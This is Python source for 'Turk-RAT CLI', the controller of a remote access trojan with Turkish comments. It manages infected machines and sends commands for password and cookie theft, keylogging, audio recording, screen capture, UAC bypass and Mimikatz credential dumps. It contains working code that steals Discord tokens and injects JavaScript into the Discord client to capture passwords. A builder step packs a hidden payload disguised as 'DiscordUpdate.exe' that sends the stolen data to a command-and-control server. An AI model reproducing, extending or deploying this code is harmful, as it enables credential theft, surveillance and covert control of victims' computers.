#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turk-RAT CLI - Discord Entegrasyonu Dahil!
Author: Kiokhan
"""

import socket
import threading
import json
import os
import time
from rich.text import Text
import cv2
import logging
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box
from getpass import getpass
import subprocess
import re  # Discord token için

# === LOG & KONSOL ===
logging.basicConfig(filename='rat_cli.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
console = Console()

# === SABİTLER ===
DEFAULT_PORT = 4443
VIDEO_PORT = 9999
BUFFER_SIZE = 4096 * 4
DOWNLOAD_DIR = "cli_downloads"
PING_KEYWORD = "PING:"
FILE_TRANSFER_KEYWORD = "FILE_TRANSFER:"
UPLOAD_KEYWORD = "UPLOAD:"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# === GLOBAL ===
clients = {}
current_client = None
server_running = True
lock = threading.Lock()

# === BANNER & LOGIN ===
def banner():
    console.clear()
    console.print(Panel(
        Text("TURK-RAT CLI", justify="center", style="bold red") + "\n" +
        Text("Uzaktan Erişim & Kontrol Sistemi", justify="center", style="dim") + "\n" +
        Text("select <id> → bağlan | help → komutlar", justify="center", style="bold cyan"),
        style="bold red", border_style="red", expand=False
    ))

def login():
    console.print(Panel("GİRİŞ YAP", style="bold red"))
    user = Prompt.ask("[bold red]Kullanıcı[/]", default="12")
    passwd = getpass("[bold red]Şifre[/] ")
    if user == "12" and passwd == "12":
        console.print("[bold green][✓] Giriş başarılı![/]")
        time.sleep(1)
        banner()
    else:
        console.print("[bold red][✗] Hatalı giriş! (12/12)[/]")
        exit()

# === PING GÖNDER ===
def send_ping():
    while server_running:
        with lock:
            for addr, data in list(clients.items()):
                try:
                    data["conn"].send(PING_KEYWORD.encode())
                    data["last_ping"] = time.time()
                except:
                    console.print(f"[red][!] {addr} bağlantısı koptu[/]")
                    del clients[addr]
        time.sleep(15)

# === CLIENT HANDLER ===
def handle_client(conn, addr):
    global current_client
    addr_str = f"{addr[0]}:{addr[1]}"
    try:
        initial = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
        system_json = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
        authority = conn.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()

        try:
            system_info = json.loads(system_json)
        except:
            system_info = {"os": "Bilinmiyor", "cpu": "?", "ram": "?", "disk": "?", "country": "XX"}

        client_id = len(clients)
        with lock:
            clients[addr] = {
                "conn": conn,
                "info": system_info,
                "authority": authority,
                "last_ping": time.time(),
                "id": client_id
            }

        console.print(f"[green][+] Yeni cihaz: {addr_str} | {system_info.get('country','?')} | {system_info.get('os','?')} | ID: {client_id}[/]")

        buffer = b""
        while server_running:
            try:
                conn.settimeout(0.1)
                data = conn.recv(BUFFER_SIZE)
                if not data:
                    break
                buffer += data
                if b'\n' in buffer:
                    lines = buffer.split(b'\n')
                    for line in lines[:-1]:
                        resp = line.decode('utf-8', errors='ignore').strip()
                        if resp:
                            process_response(addr, resp)
                    buffer = lines[-1]
            except socket.timeout:
                continue
            except:
                break

    except Exception as e:
        console.print(f"[red][!] {addr_str} hata: {e}[/]")
    finally:
        with lock:
            if addr in clients:
                console.print(f"[yellow][-] {addr_str} ayrıldı (ID: {clients[addr]['id']})[/]")
                del clients[addr]

# === DISCORD TOKEN & INJECTION (SERVER TARAFI) ===
def discord_get_token():
    paths = [
        os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
        os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
        os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb"
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            if not file.endswith(('.log', '.ldb')): continue
            try:
                with open(f"{path}\\{file}", "r", errors="ignore") as f:
                    content = f.read()
                    tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content))
                    tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
            except: pass
    return list(set(tokens)) if tokens else None

def discord_inject():
    base = os.getenv("LOCALAPPDATA") + "\\Discord"
    if not os.path.exists(base): return False
    apps = [x for x in os.listdir(base) if x.startswith("app-")]
    if not apps: return False
    latest = sorted(apps, reverse=True)[0]
    core_dir = f"{base}\\{latest}\\modules"
    cores = [x for x in os.listdir(core_dir) if x.startswith("discord_desktop_core")]
    if not cores: return False
    core_path = f"{core_dir}\\{cores[0]}\\discord_desktop_core"
    index_js = core_path + "\\index.js"
    injection = '''
// === TURK-RAT DISCORD INJECTION ===
const orig = window.fetch;
window.fetch = async (...a) => {
    const r = await orig(...a);
    if (a[0].includes('/users/@me') && a[1]?.body) {
        try {
            const b = JSON.parse(a[1].body);
            if (b.password) {
                fetch('http://127.0.0.1:4444/pwd', {method:'POST', body:JSON.stringify(b)});
            }
        } catch {}
    }
    return r;
};
'''
    try:
        if not os.path.exists(index_js):
            with open(index_js, "w") as f: f.write(injection)
            return True
        with open(index_js, "r") as f:
            if "TURK-RAT DISCORD" in f.read(): return True
        with open(index_js, "a") as f: f.write("\n" + injection)
        return True
    except: return False

def build_discord_payload():
    payload = f'''
import os, sys, json, socket, base64, time, re
from datetime import datetime

C2 = "0.0.0.0"
PORT = 4443
ID = f"{{os.getenv('COMPUTERNAME')}}_{{int(time.time())}}

def send(d):
    try:
        s = socket.socket()
        s.connect((C2, PORT))
        s.send(base64.b64encode(json.dumps(d).encode()))
        s.close()
    except: pass

def get_token():
    paths = [os.getenv("APPDATA") + f"\\\\{{x}}\\\\Local Storage\\\\leveldb" for x in ["discord","discordcanary","discordptb"]]
    tokens = []
    for p in paths:
        if not os.path.exists(p): continue
        for f in os.listdir(p):
            if not f.endswith(('.log','.ldb')): continue
            try:
                with open(f"{{p}}\\\\{{f}}", "r", errors="ignore") as ff:
                    c = ff.read()
                    tokens.extend(re.findall(r'[\\\\w-]{{24}}\\\\.[\\\\w-]{{6}}\\\\.[\\\\w-]{{27}}', c))
                    tokens.extend(re.findall(r'mfa\\\\.[\\\\w-]{{84}}', c))
            except: pass
    return list(set(tokens))

def inject():
    base = os.getenv("LOCALAPPDATA") + "\\\\Discord"
    if not os.path.exists(base): return False
    apps = [x for x in os.listdir(base) if x.startswith("app-")]
    if not apps: return False
    latest = sorted(apps, reverse=True)[0]
    core = f"{{base}}\\\\{{latest}}\\\\modules"
    cores = [x for x in os.listdir(core) if x.startswith("discord_desktop_core")]
    if not cores: return False
    js = f"{{core}}\\\\{{cores[0]}}\\\\discord_desktop_core\\\\index.js"
    inj = """// TURK-RAT INJ
const orig = window.fetch;
window.fetch = async (...a) => {{
    const r = await orig(...a);
    if (a[0].includes('/users/@me') && a[1]?.body) {{
        try {{ const b = JSON.parse(a[1].body); if (b.password) fetch('http://127.0.0.1:4444', {{method:'POST', body:JSON.stringify(b)}}); }} catch {{}}
    }}
    return r;
}};"""
    try:
        if not os.path.exists(js): open(js, "w").write(inj)
        elif "TURK-RAT INJ" not in open(js).read(): open(js, "a").write("\\n"+inj)
        return True
    except: return False

token = get_token()
inj = inject()
send({{"id": ID, "type": "discord", "token": token, "injected": inj, "time": datetime.now().isoformat()}})
while True: time.sleep(300)
'''
    with open("temp_discord.py", "w") as f: f.write(payload)
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--name=DiscordUpdate", "temp_discord.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.remove("temp_discord.py")
    os.remove("temp_discord.spec", errors="ignore")
    return "dist/DiscordUpdate.exe hazır!"

# === PROCESS RESPONSE ===
def process_response(addr, response):
    global current_client
    conn = clients[addr]["conn"]

    if response.startswith(FILE_TRANSFER_KEYWORD):
        try:
            parts = response[len(FILE_TRANSFER_KEYWORD):].split(':', 1)
            if len(parts) < 2: return
            name, size_str = parts
            size = int(size_str)
            filepath = os.path.join(DOWNLOAD_DIR, name)
            console.print(f"[cyan][↓] {name} indiriliyor... ({size:,} bayt)[/]")
            received = 0
            conn.settimeout(5.0)
            with open(filepath, 'wb') as f:
                while received < size:
                    chunk = conn.recv(min(16384, size - received))
                    if not chunk: break
                    f.write(chunk)
                    received += len(chunk)
            conn.settimeout(None)
            console.print(f"[green][✓] {filepath} indirildi ({received:,} bayt)[/]")
        except Exception as e:
            console.print(f"[red][!] İndirme hatası: {e}[/]")

    elif response.startswith("DISCORD_RESULT:"):
        try:
            data = json.loads(response[len("DISCORD_RESULT:"):])
            table = Table(title="Discord Sonuç", box=box.ROUNDED)
            table.add_column("Alan", style="cyan")
            table.add_column("Değer", style="green")
            table.add_row("Token", str(data.get("token", "Yok"))[:50] + ("..." if len(str(data.get("token",""))) > 50 else ""))
            table.add_row("Injection", "Başarılı" if data.get("injected") else "Başarısız")
            table.add_row("Zaman", data.get("time", "?"))
            console.print(table)
        except Exception as e:
            console.print(f"[red][!] Discord sonuç hatası: {e}[/]")


    elif response.startswith("MIMIKATZ_RESULT:"):
        try:
            data = response[len("MIMIKATZ_RESULT:"):]
            table = Table(title="Mimikatz LSASS Dump", box=box.DOUBLE)
            table.add_column("Credential", style="cyan")
            table.add_column("Değer", style="green")
            for line in data.split('\n'):
                if ':' in line:
                    k, v = line.split(':', 1)
                    table.add_row(k.strip(), v.strip())
            console.print(table)
            # Hash'leri kaydet
            with open(f"mimikatz_{int(time.time())}.txt", "w") as f:
                f.write(data)
            console.print(f"[green][Success] Hash'ler kaydedildi: mimikatz_*.txt[/]")
        except Exception as e:
            console.print(f"[red][Error] Mimikatz parse hatası: {e}[/]")

    else:
        if current_client and addr == current_client:
            console.print(f"[bold green][<<] {response}[/]")
        else:
            console.print(f"[dim]{addr} → {response}[/]")

# === HELP ===
def cmd_help():
    table = Table(title="Komutlar", box=box.ROUNDED)
    table.add_column("Komut", style="cyan")
    table.add_column("Açıklama", style="white")
    table.add_row("select <id>", "Cihaza bağlan/Connect to device")
    table.add_row("list", "Tüm cihazları listele/List all devices")
    table.add_row("uac_bypass", "Yetki yükselt (SADECE Windows 10 ve altı!)")
    table.add_row("grab_passwords", "Chrome/Edge şifreleri/Chrome/Edge passaword")
    table.add_row("get_cookies", "Tarayıcı cookie'leri/Browser cookies")
    table.add_row("block_website <url>", "Site engelle/web site block")
    table.add_row("unblock_website <url>", "Site aç/web site unblock")
    table.add_row("keylog", "15 saniye keylog/15 seconds keylogger")
    table.add_row("record_audio_30s", "30s ses kaydet/Record 30s of audio")
    table.add_row("ss", "Ekran görüntüsü/screenshot")
    table.add_row("screen", "Canlı ekran (q ile çık)/live screen q press and quit")
    table.add_row("download <dosya>", "Dosya indir/file download")
    table.add_row("upload <dosya>", "Dosya yükle/file upload")
    table.add_row("cd <dizin>", "Dizin değiştir/change directory")
    table.add_row("ls", "Dosya listele/file list")
    table.add_row("pwd", "Mevcut dizin/current directory")
    table.add_row("messagebox <msg>", "Mesaj kutusu/messagebox")
    table.add_row("discord_token", "Discord token çek/discord token grabber")
    table.add_row("discord_injection", "Discord injection yap/discord injections")
    table.add_row("discord_log", "Token + inj + log")
    table.add_row("build_discord", "Gizli Discord payload/hidden Discord payload")
    table.add_row("exit", "Çık/quit")
    console.print(table)

# === LİSTELE ===
def cmd_list():
    table = Table(title="Bağlı Cihazlar", box=box.DOUBLE)
    table.add_column("ID", style="bold red")
    table.add_column("IP:Port", style="cyan")
    table.add_column("OS", style="green")
    table.add_column("Ülke/country", style="yellow")
    table.add_column("CPU", style="magenta")
    table.add_column("RAM", style="blue")
    table.add_column("Yetki/authority", style="bold white")

    with lock:
        for addr, data in clients.items():
            info = data["info"]
            table.add_row(
                str(data["id"]),
                f"{addr[0]}:{addr[1]}",
                info.get("os", "?"),
                info.get("country", "XX"),
                info.get("cpu", "?"),
                info.get("ram", "?"),
                data["authority"]
            )
    console.print(table)

# === SELECT & SHELL ===
def cmd_select(client_id):
    global current_client
    with lock:
        for addr, data in clients.items():
            if data["id"] == client_id:
                current_client = addr
                console.print(f"[bold green][✓] Bağlanıldı/connect: {addr} (ID: {client_id})[/]")
                shell_loop(addr)
                current_client = None
                return
    console.print(f"[red][!] ID {client_id} bulunamadı[/]")

def shell_loop(addr):
    conn = clients[addr]["conn"]
    console.print("[dim]Komut gönder: (exit ile çık/exit and quit)[/]")
    while True:
        try:
            cmd = Prompt.ask("[bold red][>>][/bold red]")
            if cmd.lower() in ["exit", "back", "quit"]:
                console.print("[yellow][*] Shell kapatılıyor...[/]")
                break
            if not cmd.strip():
                continue

            if cmd == "uac_bypass":
                os_info = clients[addr]["info"].get("os", "")
                if "Windows 10" in os_info or ("Windows 10" in os_info and "(22621" in os_info):
                    console.print(f"[red][!] {os_info} → UAC Bypass KAPALI[/]")
                    conn.send(b"[!] Windows 10+ -> UAC Bypass YOK!\n")
                else:
                    console.print(f"[bold yellow][↑] UAC Bypass gönderiliyor → {os_info}[/]")
                    conn.send(b"uac_bypass\n")
                continue

            elif cmd == "grab_passwords":
                conn.send(b"grab_passwords\n")
                console.print("[bold yellow][Şifre] Şifre çekme başladı...[/]")
                continue

            elif cmd == "uac_bypass":
                os_info = clients[addr]["info"].get("os", "")
                if "Windows 11" in os_info:
                    console.print(f"[bold yellow][Win11] UAC Bypass (fodhelper hijack) gönderiliyor...[/]")
                elif "Windows 10" in os_info:
                    console.print(f"[bold yellow][Win10] UAC Bypass (fodhelper) gönderiliyor...[/]")
                else:
                    console.print(f"[red][!] Sadece Win10/11 desteklenir: {os_info}[/]")
                    conn.send("[!] Bu komut sadece Windows 10/11 için geçerlidir.\n".encode('utf-8'))
                    continue
                conn.send(b"uac_bypass\n")
                continue



            elif cmd == "get_cookies":
                conn.send(b"get_cookies\n")
                console.print("[bold yellow][Cookie] Cookie çekme başladı...[/]")
                continue
            elif cmd.startswith("block_website "):
                site = cmd.split(maxsplit=1)[1]
                conn.send(f"block_website {site}\n".encode())
                console.print(f"[bold yellow][Yasak] {site} engellendi[/]")
                continue
            elif cmd.startswith("unblock_website "):
                site = cmd.split(maxsplit=1)[1]
                conn.send(f"unblock_website {site}\n".encode())
                console.print(f"[bold green][Açık] {site} açıldı[/]")
                continue


            elif cmd == "mimikatz":
                conn.send(b"mimikatz\n")
                console.print("[bold red][MIMIKATZ] LSASS dump başlatılıyor...[/]")
                continue


            elif cmd == "ss":
                conn.send(b"ss\n")
                console.print("[bold cyan][Fotoğraf] Ekran görüntüsü alınıyor...[/]")
                continue
            elif cmd == "screen":
                console.print("[bold cyan][Video] Canlı ekran başlatılıyor... (q ile çık)[/]")
                threading.Thread(target=start_screen_share, args=(addr,), daemon=True).start()
                continue
            elif cmd.startswith("download "):
                path = cmd.split(maxsplit=1)[1]
                if not path.strip():
                    console.print("[red][!] Kullanım: download <dosya_yolu>[/]")
                    continue
                conn.send(f"download {path}\n".encode())
                console.print(f"[cyan][İndir] {path} isteniyor...[/]")
                continue
            elif cmd.startswith("upload "):
                local_path = cmd.split(maxsplit=1)[1]
                if os.path.exists(local_path):
                    name = os.path.basename(local_path)
                    size = os.path.getsize(local_path)
                    header = f"{UPLOAD_KEYWORD}{name}:{size}\n"
                    conn.send(header.encode())
                    time.sleep(0.3)
                    with open(local_path, "rb") as f:
                        while True:
                            data = f.read(BUFFER_SIZE)
                            if not data: break
                            conn.sendall(data)
                    console.print(f"[green][Yüklendi] {name} yüklendi[/]")
                else:
                    console.print(f"[red][!] Dosya yok: {local_path}[/]")
                continue

            # === DISCORD KOMUTLARI ===
            elif cmd == "discord_token":
                conn.send(b"discord_token\n")
                console.print("[yellow][Token] Token çekiliyor...[/]")
                continue
            elif cmd == "discord_injection":
                conn.send(b"discord_injection\n")
                console.print("[yellow][Enjeksiyon] Injection yapılıyor...[/]")
                continue
            elif cmd == "discord_log":
                conn.send(b"discord_log\n")
                console.print("[yellow][Kayıt] Token + inj + log...[/]")
                continue
            elif cmd == "build_discord":
                result = build_discord_payload()
                console.print(f"[green][EXE] {result}[/]")
                continue

            conn.send(cmd.encode() + b'\n')
        except Exception as e:
            console.print(f"[red][!] Bağlantı koptu: {e}[/]")
            break

# === CANLI EKRAN ===
def start_screen_share(addr):
    ip = addr[0]
    cap = cv2.VideoCapture(f"tcp://{ip}:{VIDEO_PORT}")
    cv2.namedWindow(f"UZAK EKRAN - {ip}", cv2.WINDOW_NORMAL)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break
        cv2.imshow(f"UZAK EKRAN - {ip}", frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    cap.release()
    cv2.destroyAllWindows()

# === SUNUCU ===
def start_server():
    global server_running
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', DEFAULT_PORT))
    server.listen(10)
    console.print(f"[bold green][+] Sunucu dinlemede: 0.0.0.0:{DEFAULT_PORT}[/]")

    threading.Thread(target=send_ping, daemon=True).start()

    while server_running:
        try:
            server.settimeout(1.0)
            conn, addr = server.accept()
            conn.setblocking(True)
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except socket.timeout:
            continue
        except:
            break
    server.close()

# === ANA DÖNGÜ ===
def main_loop():
    login()
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(1)

    while True:
        try:
            cmd = Prompt.ask("\n[bold red]turk-rat>[/]").strip()
            parts = cmd.split(maxsplit=1)
            action = parts[0].lower() if parts else ""

            if action == "help":
                cmd_help()
            elif action == "list":
                cmd_list()
            elif action.startswith("select"):
                if len(parts) > 1:
                    try:
                        cid = int(parts[1])
                        cmd_select(cid)
                    except:
                        console.print("[red][!] Geçersiz ID[/]")
                else:
                    console.print("[red][!] Kullanım: select <id>[/]")
            elif action == "clear":
                banner()
            elif action == "exit":
                global server_running
                server_running = False
                console.print("[yellow][*] Sunucu kapanıyor...[/]")
                time.sleep(1)
                break
            elif action == "":
                continue
            else:
                console.print(f"[red][!] Bilinmeyen komut: {action} | help yaz[/]")
        except KeyboardInterrupt:
            console.print("\n[yellow][*] Çıkış yapılıyor...[/]")
            break

if __name__ == "__main__":
    try:
        main_loop()
    except Exception as e:
        console.print(f"[red][!!] Kritik hata: {e}[/]")